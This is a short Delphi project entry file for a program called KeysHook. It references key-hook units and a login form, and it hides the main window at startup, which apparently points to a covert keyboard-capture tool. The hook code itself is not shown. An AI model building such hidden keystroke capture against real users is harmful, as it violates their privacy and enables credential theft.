program KeysHook;

uses
  Forms,
  U_Login in 'U_Login.pas' {LoginForm},
  KeyHookFunc in 'KeyHookFunc.pas',
  KeyHookForm in 'KeyHookForm.pas' {frmKeyHook};

{$R *.RES}

begin
  Application.Initialize;
  Application.ShowMainForm := False;
  Application.CreateForm(TfrmKeyHook, frmKeyHook);
  Application.Run;
end.

